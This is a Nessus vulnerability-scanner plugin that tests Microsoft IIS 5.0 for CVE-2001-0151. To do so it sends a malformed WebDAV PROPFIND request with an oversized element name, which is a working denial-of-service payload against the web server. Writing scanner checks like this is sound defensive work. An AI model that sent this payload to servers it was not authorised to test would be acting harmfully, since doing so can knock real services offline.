#%NASL_MIN_LEVEL 70300
#
# This script is based on Georgi Guninski's perl script
# ported to NASL by John Lampe <j_lampe@bellsouth.net>
#
# See the Nessus Scripts License for details
# Changes by Tenable
# Add MSKB script_xref (8/29/17)

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10667);
  script_version("1.52");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2001-0151");
  script_bugtraq_id(2453);
  script_xref(name:"MSFT", value:"MS01-016");
  script_xref(name:"MSKB", value:"291845");

  script_name(english:"Microsoft IIS 5.0 WebDAV Malformed PROPFIND Request Remote DoS");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service attack.");
  script_set_attribute(attribute:"description", value:
"The remote version of the IIS web server contains a bug in its
implementation of the WebDAV protocol that could allow an attacker to
temporarily disable this service remotely.

To exploit this flaw, an attacker would require the ability to send a
malformed PROPFIND request to the remote host, although this would not
in turn necessarily require authentication.");
  script_set_attribute(attribute:"see_also", value:"https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2001/ms01-016");
  script_set_attribute(attribute:"solution", value:
"Microsoft has released a patch for IIS 5.0.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2001/03/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2001/05/13");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2001-2022 John Lampe");

  script_dependencies("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80, embedded:TRUE);

sig = get_kb_item("www/hmap/" + port + "/description");
if (! sig ) sig = get_http_banner(port:port);
if ( sig && "IIS/5" >!< sig ) exit(0);

if (! get_port_state(port)) exit(0);

req = 'OPTIONS / HTTP/1.0\r\n\r\n';
soc = open_sock_tcp(port);
if (! soc )exit(0);

send(socket:soc, data:req);
r = http_recv(socket:soc);
close(soc);
if (! r ) exit(0);
if (!egrep(pattern:"^Allow:.*PROPFIND", string:r) ) exit(0);

quote = raw_string(0x22);
xml = strcat('<?xml version="1.0"?><a:propfind xmlns:a="DAV:" xmlns:u=":dav">',
    '<a:prop><a:displayname /><u:', crap(1025),
    ' /></a:prop></a:propfind>\r\n\r\n' );
l = strlen(xml);
req = string ("PROPFIND / HTTP/1.1\r\n",
  "Content-type: text/xml\r\n",
  "Host: ", get_host_name() , "\r\n",
  "Content-length: ", l, "\r\n\r\n", xml, "\r\n\r\n\r\n");


soc = http_open_socket(port);
if(! soc ) exit(0);

send(socket:soc, data:req);
r = http_recv(socket:soc);
http_close_socket(soc);
if ( r =~ "HTTP/[0-9.]+ 207 " ) security_warning(port);
